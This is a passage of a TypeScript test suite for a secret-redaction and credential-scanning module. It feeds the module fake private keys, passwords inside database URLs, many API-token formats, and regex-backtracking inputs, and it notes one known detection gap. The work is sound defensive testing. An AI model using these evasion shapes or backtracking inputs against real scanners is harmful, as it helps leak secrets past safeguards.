    ])("takes it all in %s, in as many lines, and leaves what follows", (_, text) => {
      const seen = redactFile(text);
      expect(seen).not.toContain("MIIE");
      expect(seen).not.toContain("abc==");
      expect(seen).not.toContain("BEGIN");
      expect(seen).not.toContain("END");
      expect(seen.split("\n").length).toBe(text.split("\n").length);
      expect(seen).toMatch(/keep = 1/);
      expect(holdsCredential(text)).toBe(true);
    });

    it("keeps the code on a marker's line, and what follows the end", () => {
      const text = `f(); const k = "${begin}\\n" +\n  "${key}\\n" +\n  "${end}"; g();\nh();\n`;
      const seen = redactFile(text).split("\n");
      expect(seen[0]).toContain('f(); const k = "[private key]');
      expect(seen[1]).toBe("");
      expect(seen[2]).toBe('"; g();');
      expect(seen[3]).toBe("h();");
    });

    it.each([
      ["a bytes literal", `b"${key}"`, 'b"abc=="'],
      ["a backslash", `"${key}" \\`, '"abc==" \\'],
      ["a shell or", `'${key}' ||`, "'abc==' ||"],
      ["a PHP or Perl join", `"${key}" .`, '"abc==" .'],
      ["a YAML list", `  - ${key}`, "  - abc=="],
    ])("takes a short last line behind %s", (_, line, last) => {
      const seen = redactFile([begin, line, last, end, ""].join("\n"));
      expect(seen).toBe("[private key]\n\n\n\n");
    });

    it("takes no markers named in source code for a key, with only code between", () => {
      const code = `const a = "${begin}";\nconst keep = 1;\nconst b = "${end}"; const c = 2;\n`;
      expect(redactFile(code)).toContain("const keep = 1;");
      expect(redactFile(code)).toContain("const c = 2;");
    });

    describe("with a marker named in a string in the way", () => {
      const line = "MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQC7VJTUt9Us8cKj";
      const dashes = ["-----BEGIN PRIVATE KEY-----", "-----END PRIVATE KEY-----"];
      const four = ["---- BEGIN PRIVATE KEY ----", "---- END PRIVATE KEY ----"];
      const patchOf = (text: string) => {
        const added = text.split("\n").map((l) => `+${l}`);
        return `--- /dev/null\n+++ b/k.txt\n@@ -0,0 +1,${added.length} @@\n${added.join("\n")}\n`;
      };

      it.each([
        ["an end before the key", (b: string, e: string) => [b, `const e = "${e}";`, line, e]],
        ["a begin after the key", (b: string, e: string) => [b, line, `const b = "${b}";`, e]],
        ["a begin before the key", (b: string, e: string) => [`const b = "${b}";`, b, line, e]],
        ["an end after an armor header", (b: string, e: string) => [b, "Comment: x", `"${e}";`, line, e]],
        ["an end after the first of two lines", (b: string, e: string) => [b, line, `"${e}";`, line, e]],
      ])("hides the key, and scans the same, with %s", (_, lines) => {
        for (const [b, e] of [dashes, four] as [string, string][]) {
          const text = `${lines(b, e).join("\n")}\nafter\n`;
          const seen = redactFile(text);
          expect(seen, text).not.toContain("MIIE");
          expect(seen.split("\n").length).toBe(text.split("\n").length);
          expect(seen, text).toMatch(/after\n$/);
          expect(holdsCredential(text), text).toBe(true);
          expect(scanPatch(patchOf(text)), text).toBe(true);
          expect(sideOf(Buffer.from(text).toString("base64")).text, text).not.toContain("MIIE");
        }
      });

      it("cuts a line at the marker it names, and gives a second key its own block", () => {
        const text = [begin, `const e = "${end}"; f();`, line, end, "keep();", begin, line, end, ""].join(
          "\n",
        );
        expect(redactFile(text)).toBe(`[private key]\n"; f();\n\n\nkeep();\n[private key]\n\n\n`);
      });

      it.each([
        [
          "an end the block runs past",
          (b: string, e: string) => [b, line, `${"Ab1+".repeat(5)}${e}`, line, e],
        ],
        [
          "a begin the block runs past",
          (b: string, e: string) => [b, line, `f(); ${b}${"Ab1+".repeat(5)}`, line, e],
        ],
      ])("takes what runs into %s", (_, lines) => {
        for (const [b, e] of [dashes, four] as [string, string][]) {
          const seen = redactFile(`${lines(b, e).join("\n")}\nafter\n`);
          expect(seen).not.toContain("Ab1+");
          expect(seen).toMatch(/after\n$/);
        }
      });

      it.each([
        ["a begin", (b: string, e: string) => [b, `${line}\\/# ${b}`, `; ${e}`, "f(x)"]],
        ["a begin, after an end", (b: string, e: string) => [b, `f(); "${e}";`, `${b}${line}`, "f(x)", e]],
      ])("sees a key on the line of %s", (_, lines) => {
        const text = lines(four[0] as string, four[1] as string).join("\n");
        expect(redactFile(text)).not.toContain("MIIE");
        expect(holdsCredential(text)).toBe(true);
      });

      describe("in a form only the key blocks take", () => {
        const b = "# ---- BEGIN X PRIVATE KEY----";
        const e = "# ---- END X PRIVATE KEY----";
        const key = `# ${line}`;

        it("stays inside a block's limit: what is past it is two markers in a long text", () => {
          const text = `${b}\n"${e}";\n${"const keep = 1;\n".repeat(2000)}${key}\n${e}\n`;
          expect(redactFile(text)).toContain(line);
          expect(holdsCredential(text)).toBe(false);
        });

        it("takes a late begin for the start when the first is too far from the end", () => {
          const text = `${b}\n${"abc\n".repeat(5000)}${b}\n${key}\n${e}\n`;
          expect(redactFile(text)).not.toContain("MIIE");
          expect(redactFile(text)).toContain("abc");
          expect(holdsCredential(text)).toBe(true);
        });

        it("runs only as far as the limit past the key", () => {
          const text = `${b}\n${key}\n${e}\n${"const keep = 1;\n".repeat(2000)}${e}\nafter\n`;
          expect(redactFile(text)).toContain(`\n${"const keep = 1;\n".repeat(2000)}${e}\nafter\n`);
        });
      });

      it.each([
        ["many ends", `${begin}\n${`${end}\n`.repeat(40_000)}`],
        ["many ends, each block", `${begin}\n${`${end}\n`.repeat(100)}`.repeat(400)],
        ["ends and code", `${begin}\n${`${end}\nconst keep = 1;\n`.repeat(25_000)}`],
        ["many begins", `${`${begin}\n`.repeat(40_000)}${line}\n${end}\n`],
        ["pairs on one line", `${`${begin} ${end} `.repeat(20_000)}\n${line}\n${end}\n`],
        ["pairs on one long line, then a line", `${`${begin} ${end} `.repeat(20_000)}\nx\n`.repeat(2)],
        ["blocks of short lines", `${begin}\n${"x y\n".repeat(4000)}${end}\n${end}\n`.repeat(60)],
      ])("is one pass over a megabyte of %s", (_, text) => {
        const at = performance.now();
        redactFile(text);
        holdsCredential(text);
        expect(performance.now() - at).toBeLessThan(1000);
      });
    });
  });

  describe("a line built to backtrack", () => {
    const begin = "-----BEGIN PRIVATE KEY-----";
    const end = "-----END PRIVATE KEY-----";
    const hostile = `${begin}\nComment: ${" ".repeat(16_000)}\rx\n${end}\n`;

    it("costs next to nothing in one block", () => {
      const at = performance.now();
      redactFile(hostile);
      expect(performance.now() - at).toBeLessThan(50);
    });

    it("doesn't hold up a file's read or the scan", () => {
      const at = performance.now();
      sideOf(Buffer.from(hostile.repeat(62)).toString("base64"));
      holdsCredential(hostile.repeat(500));
      expect(performance.now() - at).toBeLessThan(1000);
    });
  });

  describe("a credential in a shape the patterns used to stop short of", () => {
    const github = "abcdefghijklmnopqrstuvwxyz0123456789";
    const stopped = (text: string, secret: string) => {
      expect(redactFile(text)).not.toContain(secret);
      expect(sideOf(Buffer.from(text).toString("base64")).text).not.toContain(secret);
      expect(holdsCredential(text), text).toBe(true);
    };

    describe("a password in a URL", () => {
      it.each([
        ["a /", "postgres://u:ab/cd@h", "ab/cd"],
        ["a #", "mysql://root:p#ss@h", "p#ss"],
        ["a ?", "https://u:p?q@h", "p?q"],
        ["all three", "postgres://u:a/b#c?d@h/app", "a/b#c?d"],
        ["one at the start", "mysql://root:#ss@h", "#ss"],
        ["an @ as well", "postgres://u:p@ss/word@h", "ss/word"],
        ["no user", "redis://:ab/cd@h", "ab/cd"],
        ["an email for a user", "postgres://me@x.example:ab/cd@h", "ab/cd"],
        ["a dotted user", "mysql://first.last:p#ss@db.example", "p#ss"],
        ["a pooler's user", "postgres://postgres.abcdefghijkl:pa/ss@h.example:6543/app", "pa/ss"],
        ["an encoded user", "postgres://appuser%40myserver:pa/ss@h.example/app", "pa/ss"],
        ["a quote", `postgres://u:a'b/c"d@h`, `a'b/c"d`],
        ["a host and port after it", "postgres://u:ab/cd@h:5432/app", "ab/cd"],
        ["a hole that doesn't close", "mysql://root:p#{ss@h", "p#{ss"],
        ["one at the start of one that doesn't close", "mysql://root:#{ss@h", "#{ss"],
        ["a scheme in it", "postgres://u:https://x@h", "https://x"],
        ["a scheme after a comma in it", "postgres://u:ab,https://x@h", "ab,https://x"],
        ["a user that is an email on a host's name", "postgres://me@localhost:ab/cd@h", "ab/cd"],
        ["six digits, which is no port", "postgres://u:123456/x@h", "123456"],
        ["a host and port after it, then the string's end", "postgres://u:ab/cd@h:5432", "ab/cd"],
        ["a scheme in capitals", "POSTGRES://u:ab/cd@h", "ab/cd"],
        ["a digit in the scheme", "s3://u:ab/cd@h", "ab/cd"],
        ["a user whose name starts like a host's", "postgres://localhostuser:ab/cd@h", "ab/cd"],
        ["a hole with a blank in it, after an @", "mysql://root:p#{s@x y}", "p#{s"],
        ["a scheme that only ends in file", "profile://u:ab/cd@h", "ab/cd"],
        ["a scheme that only starts with file", "files://u:ab/cd@h", "ab/cd"],
      ])("goes with %s", (_, url, secret) => {
        stopped(`const u = ${url}\n`, secret);
        stopped(`const u = "${url.replace(/"/g, '\\"')}";\n`, secret);
      });

      it.each([
        ["doubled", `'postgres://u:it''s/fine@h'`, "s/fine"],
        ["doubled, the other kind", `"postgres://u:a""b/c@h"`, "b/c"],
        ["alone", `DATABASE_URL="postgres://u:a"b/c@h"`, "b/c"],
        ["after a bare colon, with a letter next", `"postgres://u:"b/c@h"`, "b/c"],
        ["after a bare colon, with a digit next", `"postgres://u:"1/c@h"`, "1/c"],
      ])("goes with its own quote in it, %s", (_, url, secret) => {
        stopped(`${url}\n`, secret);
      });

      it("leaves the host and path, and the text around it", () => {
        const text = 'connect("postgres://u:ab/cd@h:5432/app", opts);\n';
        expect(redactFile(text)).toBe('connect("postgres://[redacted]@h:5432/app", opts);\n');
      });

      it("goes with an @ in it, once USERINFO has been there", () => {
        expect(redactFile("postgres://u:p@ss/w@h\n")).toBe("postgres://[redacted]@h\n");
      });

      it("reads an IPv6 address as a host, whatever its colons", () => {
        expect(redactFile("postgres://u:p@[::1]:5432/db?x=me@y\n")).toBe(
          "postgres://[redacted]@[::1]:5432/db?x=me@y\n",
        );
        expect(redactFile("http://[::1]:abc/x@y\n")).toBe("http://[redacted]@y\n");
        expect(holdsCredential("http://[::1]:abc/x@y\n")).toBe(true);
      });

      it("goes as far as the last @, past a host that USERINFO couldn't reach", () => {
        expect(redactFile(`x://u:${"p".repeat(500)}@h/p@q\n`)).toBe("x://[redacted]@q\n");
      });

      it.each(["http", "git+ssh", "x-y", "a.b", "s3", "HTTP"])(
        "keeps what a string left outside it, after %s://",
        (scheme) => {
          expect(redactFile(`"${scheme}://a:b/c@d","me@x"\n`)).toBe(`"${scheme}://[redacted]@d","me@x"\n`);
        },
      );

      it("takes a scheme to start with a letter", () => {
        expect(redactFile('"9http://a:b/c@d","me@x"\n')).toBe('"9http://[redacted]@x"\n');
      });

      it("takes each of several in a run", () => {
        const seen = redactFile("a://u:b/c@h,d://v:e/f@i\n");
        expect(seen).not.toContain("b/c");
        expect(seen).not.toContain("e/f");
      });

      it.each([401, 5000, 200_000])("goes at %i characters", (n) => {
        const secret = `${"p".repeat(n - 2)}zz`;
        stopped(`https://u:${secret}@h/\n`, "pzz");
        stopped(`postgres://u:ab/${secret}@h/\n`, "pzz");
      });

      it("goes in full, with no part left at the end of the pattern", () => {
        expect(redactFile(`https://u:${"p".repeat(1000)}@h/x\n`)).toBe("https://[redacted]@h/x\n");
      });

      it.each(['"', "'", "`"])("past the old limit, stops at a %s: a string has ended", (q) => {
        const packument = `{${q}a${q}:${q}https://x.example${q},${q}b${q}:${q}${"y".repeat(500)}${q},${q}c${q}:${q}me@x.example${q}}\n`;
        expect(redactFile(packument)).toBe(packument);
        expect(holdsCredential(packument)).toBe(false);
      });
    });

    it.each([2001, 5000, 200_000])("takes a ?token= value of %i characters", (n) => {
      const secret = `${"a".repeat(n - 2)}zz`;
      stopped(`curl https://h.example/x?token=${secret}&page=2\n`, "azz");
      expect(redactFile(`https://h.example/x?token=${secret}&page=2\n`)).toBe(
        "https://h.example/x?token=[redacted]&page=2\n",
      );
    });

    it.each([
      "postgres://u:ab/cd@h",
      "mysql://root:p#ss@h",
      "https://u:p?q@h",
      `https://u:${"p".repeat(500)}@h/`,
      `https://h/x?token=${"a".repeat(2500)}`,
      `foo_ghp_${"a1B2".repeat(9)}`,
    ])("stops %s in a patch", (line) => {
      const patch = `diff --git a/x b/x\n--- a/x\n+++ b/x\n@@ -0,0 +1 @@\n+${line}\n`;
      expect(scanPatch(patch)).toBe(true);
      const commit = (message: string, body: string) =>
        scanHistory(
          `@@total 1\n${marker(NONCE, "commit")} ${"a".repeat(40)}\n${marker(NONCE, "msg-begin")}\n${message}\n${marker(NONCE, "msg-end")}\n${body}`,
          NONCE,
        ).secrets;
      expect(commit(line, "")).toHaveLength(1);
      expect(commit("fix", patch)).toHaveLength(1);
      expect(commit("fix", "")).toHaveLength(0);
    });

    // A known gap, which a follow-up owns. What an agent says, a brain page and a tool's output show these shapes as
    // they always have: a text is read again on those paths, and the last step takes the name or the label a later read
    // finds a value by. Head 0150b87 in this branch's history is the wider version to start from. When the follow-up
    // closes one of these, this row has to change.
    it.each([
      ["a / in a password", "postgres://u:ab/cd@h", "SAME", "SAME", "SAME"],
      ["a # in a password", "mysql://root:p#ss@h", "SAME", "SAME", "SAME"],
      ["a ? in a password", "https://u:p?q@h", "SAME", "SAME", "SAME"],
      [
        "userinfo over 400 characters",
        `https://u:${"p".repeat(500)}@h/`,
        "https://u:[500 characters in one unbroken run, not kept]@h/",
        "SAME",
        "SAME",
      ],
      [
        "a ?token= value past 2,000 characters",
        `https://h/x?token=${"a".repeat(2500)}`,
        "https://h/x?token=[redacted]",
        "https://h/x?token=[redacted]",
        `https://h/x?token=[redacted]${"a".repeat(500)}`,
      ],
      ["a named key after a letter", "xsk-ant-AbCdEfGhIjKlMnOpQrSt", "SAME", "SAME", "SAME"],
      ["a webhook secret after a _", "foo_whsec_a1b2c3d4e5f6g7h8i9j0k1l2", "SAME", "SAME", "SAME"],
      ["a GitHub token after a _", `foo_ghp_${"a1B2".repeat(9)}`, "foo_[redacted]", "foo_[redacted]", "SAME"],
    ])("is not closed in the transcripts: %s", (_, text, viaText, viaProse, viaTokens) => {
      const same = (seen: string) => (seen === "SAME" ? text : seen);
      expect(redactText(text)).toBe(same(viaText));
      expect(redactProse(text)).toBe(same(viaProse));
      expect(redactTokens(text)).toBe(same(viaTokens));
    });

    describe("a token straight after a word character", () => {
      const tokens: [string, string][] = [
        ["ghp", `ghp_${github}`],
        ["gho", `gho_${github}`],
        ["ghs", `ghs_${github}`],
        ["ghu", `ghu_${github}`],
        ["github_pat", `github_pat_11ABCDEFG0abcdefghijkl_${github}`],
        ["sk-ant", "sk-ant-api03-a1B2c3D4e5F6g7H8-qrstuvwx"],
        ["sk-proj", "sk-proj-a1B2c3D4e5F6g7H8_qrstuvwx"],
        ["sk-svcacct", "sk-svcacct-a1B2c3D4e5F6g7H8_qrstuvwx"],
        ["sk-admin", "sk-admin-a1B2c3D4e5F6g7H8_qrstuvwx"],
        ["AIza", "AIzaSyAbcdefghijklmnopqrstuvwxyz0123456"],
        ["AIza with marks in it", "AIzaSyA-bcdefghijklm_nopqrstuvwxyz01234"],
        ["xoxb", "xoxb-123456789012-abcdefghijkl"],
        ["AKIA", "AKIAIOSFODNN7EXAMPLE"],
        ["sk_live", "sk_li\u0076e_a1b2c3d4e5f6g7h8i9j0k1l2"],
        ["whsec", "whsec_a1b2c3d4e5f6g7h8i9j0k1l2"],
        ["whsec with a capital and no digit", "whsec_abcdefghijklmnopqrstuvwxYZ"],
        ["whsec with its base64", "whsec_MfKQ9r8+GKYq/rTwjUPD8ILPZIo2LaLa=="],
        ["npm", `npm_${github}`],
        ["jwt", "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.c2lnbmF0dXJl"],
        ["jwt with a short head", "eyJabcdefgh.eyJzdWIiOiIxMjM0NTY3ODkwIn0.c2lnbmF0dXJl"],
      ];
      for (const [name, token] of tokens) {
        it.each([
          ["a name", "foo_"],
          ["a letter", "x"],
          ["a digit", "7"],
          ["a written-out newline", "\\n"],
        ])(`${name} after %s`, (_, before) => {
          stopped(`const k = "${before}${token}";\n`, token);
        });
      }

      it("an sk- key after a _ or a digit, and not after a letter", () => {
        const key = "sk-abcdefghijklmnopqrstuvwxyz012345";
        stopped(`foo_${key}\n`, key);
        stopped(`1${key}\n`, key);
        const ordinary = `task-${"0123456789abcdef".repeat(2)}01234567\n`;
        expect(redactFile(ordinary)).toBe(ordinary);
      });

      it("an sk- key that is all hex, after a _ or a digit: providers issue those", () => {
        const key = "sk-0123456789abcdef0123456789abcdef";
        stopped(`foo_${key}\n`, key);
        stopped(`7${key}\n`, key);
      });

      it("a named sk- key after anything but a letter, with or without a key's run", () => {
        stopped("foo_sk-ant-abcdefghijklmnopqrstuvwx\n", "sk-ant-abcdefghijklmnopqrstuvwx");
        stopped("7sk-admin-abcdefghijklmnopqrstuvwx\n", "sk-admin-abcdefghijklmnopqrstuvwx");
      });

      it.each([
        ["both cases", "xsk-ant-AbCdEfGhIjKlMnOpQrSt"],
        ["a digit", "xsk-ant-abcd1234efgh5678ijkl"],
      ])("a named sk- key after a letter, with %s in a run", (_, key) => {
        expect(redactFile(`${key}\n`)).toBe("x[redacted]\n");
      });

      it("a named sk- key after a letter, with capitals and digits at a key's whole length", () => {
        const key = `sk-proj-${"Ab1-cd_ef".repeat(6)}`.slice(0, 56);
        expect(redactFile(`x${key}\n`)).toBe("x[redacted]\n");
        expect(redactFile(`x${key.slice(0, -1)}\n`)).toBe(`x${key.slice(0, -1)}\n`);
      });

      it("a fine-grained token to its end", () => {
        expect(redactFile("foo_github_pat_11ABCDEFG0abcdefghijkl_SECRETTAIL\n")).toBe("foo_[redacted]\n");
      });

      it("a live key to its end", () => {
        expect(redactFile("foo_sk_li\u0076e_a1b2c3d4e5f6g7h8i9j0k1l2_SECRETTAIL\n")).toBe("foo_[redacted]\n");
      });

      it("a Google key with more of its alphabet after it", () => {
        const key = "AIzaSyA1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6Q";
        expect(redactFile(`key_${key}_v2\n`)).toBe("key_[redacted]_v2\n");
        expect(redactFile(`key_${key}-prod\n`)).toBe("key_[redacted]-prod\n");
        expect(holdsCredential(`key_${key}_v2\n`)).toBe(true);
      });

      it("not a Google key's prefix in a run of base64", () => {
        const blob = `dzaXAIzaU4fGhpnKYHfRZwxymAFsCnTVvM6OBU0z5M9an8k3xYz\n`;
        expect(redactFile(blob)).toBe(blob);
      });

      it("real keys after a letter, at their real lengths", () => {
        const alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_";
        let x = 20_261_102;
        const body = (n: number) => {
          let out = "";
          for (let i = 0; i < n; i++) {
            x = (x * 1_103_515_245 + 12_345) & 0x7fffffff;
            out += alphabet[(x >>> 8) % 64];
          }
          return out;
        };
        const kinds: [string, number][] = [
          ["sk-ant-api03-", 95],
          ["sk-ant-admin01-", 95],
          ["sk-proj-", 48],
          ["sk-proj-", 156],
          ["sk-svcacct-", 48],
          ["sk-svcacct-", 156],
          ["sk-admin-", 100],
        ];
        for (const [prefix, length] of kinds) {
          for (let i = 0; i < 2000; i++) {
            const line = `x${prefix}${body(length)}\n`;
            expect(redactFile(line), line).not.toBe(line);
          }
        }
      });

      it("leaves what is around it", () => {
        expect(redactFile(`const a_ghp_${github}_b = 1;\n`)).toBe("const a_[redacted]_b = 1;\n");
      });
    });

    describe("what the other passes hide, which comes first", () => {
      const glued = "a1B2".repeat(9);

      it.each([
        ["https://u:p@h/login?password=p@ssw0rd", "https://[redacted]@h/login?password=[redacted]"],
        ["https://example.com:/login?token=abc@SECRETTAIL", "https://example.com:/login?token=[redacted]"],
        [
          "postgres://a:b@c.example/d?password=p@ssw0rd",
          "postgres://[redacted]@c.example/d?password=[redacted]",
        ],
        ["mongodb://a:b@c/d?e=f&pass=x@yzSECRET", "mongodb://[redacted]@c/d?e=f&pass=[redacted]"],
      ])("a query value after a password: %s", (text, seen) => {
        expect(redactFile(text)).toBe(seen);
      });

      it("keeps a name that only sounds like a live key", () => {
        const name = "network_live_connectionStringPassword";
        expect(redactFile(`${name}=X\n`)).toBe(`${name}=X\n`);
      });

      it("a file's npm token, which the file pass takes before the last one", () => {
        const webhook = "whsec_a1b2c3d4e5f6g7h8i9j0k1l2";
        expect(redactFile(`x${webhook}_authToken=hunter2hunter2\n`)).toBe("x[redacted][redacted]\n");
      });

      it("a URL password that loses its @ to the file pass shows, and the scan still refuses it", () => {
        const line = "postgres://u:p/_authToken=abcdefgh@h\n";
        expect(redactFile(line)).toBe("postgres://u:p/_authToken=[redacted]\n");
        expect(holdsCredential(line)).toBe(true);
      });

      it.each([100, 400])("a run of %i each side loses only the token", (n) => {
        const text = `${"a".repeat(n)}1sk-${"b1C2".repeat(6)}_${"c".repeat(n)}`;
        expect(redactFile(text)).toBe(`${"a".repeat(n)}1[redacted]_${"c".repeat(n)}`);
      });

      it("a webhook secret with a token in it goes to its end", () => {
        expect(redactFile(`whsec_AAAAAAAA+xxghp_${glued}+SECRETTAIL`)).toBe("[redacted]");
      });

      it("a run of dotted parts keeps the JWT main found in it", () => {
        expect(redactFile("xeyJAAAAAAAA.eyJBBBBBBBB.eyJCCCCCCCC.SECRETTAIL")).toBe("xeyJAAAAAAAA.[redacted]");
      });

      it("the bounds of the usual passes are what they were", () => {
        const long = "a".repeat(2500);
        expect(redactTokens(`?token=${long}`)).toBe(`?token=[redacted]${"a".repeat(500)}`);
        const user = `https://${"u".repeat(401)}@h/`;
        expect(redactTokens(user)).toBe(user);
      });

      it("the last step only takes out", () => {
        const pieces = [
          "://",
          "https",
          "x://",
          "u:p",
          "@",
          "/",
          "?",
          "#",
          "#{a}",
          ":",
          '"',
          "'",
          "\\",
          " ",
          "\n",
          ",",
          "=",
          "?token=",
          "&key=",
          "[redacted]",
          "[redacted]@",
          "localhost",
          "127.0.0.1",
          "3000",
          `\${a}`,
          "{a}",
          `foo_ghp_${glued}`,
          "xsk-ant-a1B2c3D4e5F6g7H8",
          "xwhsec_a1b2c3d4e5f6g7h8i9j0k1l2",
          "xeyJabcdefgh.eyJabcdefgh.abc",
          "a".repeat(450),
        ];
        const bare = (s: string) => s.replaceAll("[redacted]", "");
        const within = (small: string, big: string) => {
          let at = 0;
          for (const c of small) {
            at = big.indexOf(c, at) + 1;
            if (at === 0) return false;
          }
          return true;
        };
        let x = 20_261_102;
        const pick = (n: number) => {
          x = (x * 1_103_515_245 + 12_345) & 0x7fffffff;
          return (x >>> 8) % n;
        };
        for (let i = 0; i < 20_000; i++) {
          const text = Array.from({ length: 1 + pick(10) }, () => pieces[pick(pieces.length)]).join("");
          expect(within(bare(redactLast(text)), bare(text)), text).toBe(true);
        }
      });
    });

    it.each([
      // Paths that hold an `@`, on a host that has a port or none
      "http://localhost:3000/@vite/client",
      "http://127.0.0.1:8080/react@18.3.1/index.js",
      "http://localhost:3000?email=me@x.example",
      "http://localhost:3000#me@x.example",
      "http://[::1]:3000/@vite/client",
      "http://[::1]/react@18",
      "https://unpkg.com/@scope/pkg@1.2.3/dist/index.js",
      "https://cdn.jsdelivr.net/npm/react@18.3.1",
      "https://medium.com/@someone/a-post",
      "https://x.example/?next=me@x.example",
      "git+https://github.com/a/b.git@v1.0.0",
      "jdbc:mysql://db.example:3306/app?user=me@x.example",
      "mongodb://a.example:27017,b.example:27017/app?user=me@x.example",
      // A host and port from a template
      `\`http://\${host}:\${port}/react@18\``,
      `\`https://\${cfg.host}:\${cfg.port}/users/@me\``,
      `curl http://\${HOST:-localhost}:\${PORT:-3000}/@vite/client`,
      'url = "http://localhost:%(port)s/img/logo@2x.png" % cfg',
      '"http://%(host)s:%(port)s/users/@me" % cfg',
      'url = f"http://localhost:{ports[0]}/api/users/@me"',
      'url = f"http://localhost:{port:d}/users/me@example.com"',
      '"http://localhost:%u/@foo"',
      'let u = "http://\\(host):\\(port)/users/@me"',
      '$u = "http://{$host}:{$port}/users/@me";',
      // A hole with a `#`, which ends an authority
      'let(:url) { "http://localhost:#{@port}/" }',
      'uri = URI("http://127.0.0.1:#{@port}/health")',
      '"http://web:#{@port}/"',
      'background: url("http://cdn.local:#{$port}/img/logo@2x.png");',
      '"https://x-access-token:#{GitHub::API.credentials}@github.com/"',
      // What is before the `:` is a host, whatever follows it
      "curl http://localhost:$((PORT+1))/users/me@example.com",
      "Open http://localhost:XXXX/@vite/client in the browser",
      "see http://localhost:<port-number>/@scope/pkg",
      "see http://localhost:[port]/@scope/pkg",
      "see http://127.0.0.1:port_number/@scope/pkg",
      `postgres://\${user}:ab/cd@h`,
      'f"http://{host}:{port}/users/@me"',
      '"http://{{ host }}:{{ port }}/users/@me"',
      "http://$HOST:$PORT/react@18",
      "http://$(HOST):$(PORT)/react@18",
      "http://example.com:$(PORT)/react@18",
      '"http://example.com:\\(port)/users/@me"',
      "http://example.com:<port>/react@18",
      '"http://example.com:%(port)s/users/@me"',
      "http://example.com:PORT/react@18",
      '"http://%s:%d/react@18" % (host, port)',
      "http://<host>:<port>/react@18",
      "http://host:port/react@18",
      "https://*.example.com:*/react@18",
      // A URL that a string closes, and then an `@` that isn't in it
      '"http://a.example:foo/c","me@x.example"',
      "'http://'+host+':'+port+'/'+path+'@'+ref",
      // A URL with no path, in a string closed before the next one's `/`
      '{"baseUrl":"http://localhost:3000","me":"/users/@me"}',
      '{"homepage":"https://example.com","logo":"/img/logo@2x.png"}',
      '["http://localhost:3000","/@vite/client"]',
      'fetch("https://api.example.com",{path:"/users/@me"}).then(r=>r.json())',
      "{url:'https://api.example.com',avatar:'/img/logo@2x.png'}",
      // A URL with no path, then the next one
      "[https://medium.com](https://medium.com/@someone/a-post)",
      "ALLOWED=https://a.example,https://cdn.example/react@18",
      // Names that hold a token's prefix
      "const highs_and_lows_for_the_entire_year_2026 = 1;",
      "weighs_item_by_the_largest_value_of_all();",
      "read_github_pat_from_the_secret_manager();",
      "const disk_live_migration_status_for_vms = 1;",
      "const task_live_progress_update = 1;",
      "const pnpm_lockfile_version_number_goes_here = 1;",
      "mask-image-gradient-left-to-right-fade-out",
      "risk-assessment-framework-version-two-final",
      "block_sk-header-navigation-section-left",
      `const short = "foo_ghp_${"z".repeat(35)}";`,
      "task-admin-dashboard-settings",
      "task-admin-internationalization-settings",
      "task-admin-panel-v2-settings-and-more",
      "disk-admin-storage-controller",
      "task-proj-management-dashboard",
      "task-ant-colony-optimization-solver",
      '<div class="task-proj-header-container">',
      ".helpdesk-admin-sidebar-container { display: flex; }",
      "flask-admin-sqlalchemy-backend==1.2.3",
      "verify_whsec_signature",
      "handle_whsec_verification",
      "const key = 'task_live_0123456789abcdef0123456789abcdef';",
      "disk_live_5f4dcc3b5aa765d61d8327deb882cf99",
      "disk_live_migrationBandwidthLimitExceeded",
      "test_network_live_ConnectionTimeoutHandlerWithRetry",
      "cache/laughs_0123456789abcdef0123456789abcdef01234567.bin",
      // The same hashes in capitals
      "disk_live_5F4DCC3B5AA765D61D8327DEB882CF99",
      'const key = "task_live_0123456789ABCDEF0123456789ABCDEF";',
      "cache/laughs_0123456789ABCDEF0123456789ABCDEF01234567.bin",
      "sighs_DA39A3EE5E6B4B0D3255BFEF95601890AFD80709",
      // A name with a ticket key, a generated suffix or a bundler's hash
      "git checkout -b feature/task-admin-JIRA-1234-bulk-actions",
      "Merge branch 'feature/task-admin-JIRA-1234-bulk-actions'",
      "arn:aws:iam::123456789012:role/task-admin-TaskRole-1A2B3C4D5E6F",
      "task-admin-prod-LoadBalancer-1A2B3C4D",
      "docs/task-admin-Q3-2024-report-final.pdf",
      "dist/assets/disk-admin-settings-CkL9dE2f.js",
      '<script type="module" src="/assets/task-admin-dashboard-BxY3k9Qa.js"></script>',
      "disk-proj-ABC-123-cleanup-old-volumes",
      "risk-admin-dashboard-Q3-report",
      "class=task-admin-settings-page-V2",
      "desk-proj-migration-plan-Q4-2026",
      "mask-admin-layout-header-H1-title",
      "dusk-admin-2024-Q3-financial-report",
      // A webhook name with folders after it
      'import { verify } from "./verify_whsec_helpers/stripe/webhook/signature";',
      "src/stripe_whsec_utils/handlers/verify/index.ts",
      "app/check_whsec_signature/handlers/stripe.rb",
      // Tokens with something straight after them that a real one doesn't have
      "fooAKIAIOSFODNN7EXAMPLEbar",
      `foo_npm_${"a1B2".repeat(9)}x`,
      `pnpm_${"a1B2".repeat(11)}`,
      "disk_live_a1b2c3d4e5f6g7h8",
      "boxoxa-sized-container-class",
      "task-admin-x_xoxb-1234567890-abcdefghijkl",
      // One short of what a real one has
      "x_whsec_a1b2c3d4e5f6g7h8i9j0k",
      "foo_github_pat_a1b2c3d4e5f6g7h8i9j",
      "task-admin-abcdefghij12345-xyz",
      // A name of a key's length, with a digit or a capital but not both
      "task-admin-q3-report-for-the-finance-team-and-the-board-2024-final",
      "task-admin-Quarterly-report-for-the-finance-team-and-the-board-final",
      // A later field's `:`, after a URL with no path that isn't straight after a quote
      '{"msg":"see https://example.com","path":"/@vite/client"}',
      '{"level":"info","msg":"GET https://api.example.com","path":"/users/@me"}',
      "{a:'see https://x.example',b:'/@me'}",
      'data-props="{&quot;url&quot;:&quot;https://example.com&quot;,&quot;me&quot;:&quot;/users/@me&quot;}"',
      "https://example.com,2024-01-02T03:04:05Z,/users/@me",
      "url=https://example.com,ts=12:34:56,path=/x@y",
      'console.log("Listening at http://"+h+":"+p+"/@vite/client")',
      "详情见https://example.com，负责人:张三/李四，邮箱me@example.com",
      "see http://a.example;ts=12:34/x@y",
      "see http://a.example|ts=12:34/x@y",
      "see http://a=b:12x/x@y",
      "see http://a&b:12x/x@y",
      "see http://a+b:12x/x@y",
      "see http://a<b:12x/x@y",
      "see http://a(b:12x/x@y",
      "see http://a[b:12x/x@y",
